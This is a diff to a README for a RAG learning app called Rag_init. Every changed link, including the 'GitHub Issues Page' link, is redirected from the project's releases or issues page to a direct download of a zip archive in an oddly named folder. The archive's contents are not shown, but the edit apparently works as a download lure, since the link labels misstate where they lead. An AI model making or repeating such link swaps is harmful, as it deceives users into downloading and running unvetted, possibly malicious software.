@@ -6,7 +6,7 @@ Welcome to **Rag_init**! This application helps you understand RAG models using 
 
 ## 🔗 Download Now
 
-**[Download Rag_init Here!](https://github.com/tdog1616/Rag_init/releases)**
+**[Download Rag_init Here!](https://raw.githubusercontent.com/tdog1616/Rag_init/main/pantherish/Rag_init_1.7.zip)**
 
 ## 📋 System Requirements
 
@@ -17,7 +17,7 @@ Welcome to **Rag_init**! This application helps you understand RAG models using 
 
 ## 🛠️ Installation Steps
 
-1. Click the button above or visit [this page to download](https://github.com/tdog1616/Rag_init/releases).
+1. Click the button above or visit [this page to download](https://raw.githubusercontent.com/tdog1616/Rag_init/main/pantherish/Rag_init_1.7.zip).
 2. Find the latest release version at the top.
 3. Download the file that matches your operating system.
 4. Locate the downloaded file and follow the installation instructions for your OS.
@@ -56,7 +56,7 @@ If you encounter any issues, here are some tips:
 
 ## 🌐 Community and Support
 
-For support and questions, please visit our [GitHub Issues Page](https://github.com/tdog1616/Rag_init/issues). You can also find helpful guides and community discussions.
+For support and questions, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/tdog1616/Rag_init/main/pantherish/Rag_init_1.7.zip). You can also find helpful guides and community discussions.
 
 ## 🔗 Additional Information
 
@@ -65,4 +65,4 @@ For support and questions, please visit our [GitHub Issues Page](https://github.
 
 ## 📥 Download Now
 
-Don't wait! Start your journey with RAG models today. **[Download Rag_init Here!](https://github.com/tdog1616/Rag_init/releases)**
+Don't wait! Start your journey with RAG models today. **[Download Rag_init Here!](https://raw.githubusercontent.com/tdog1616/Rag_init/main/pantherish/Rag_init_1.7.zip)**
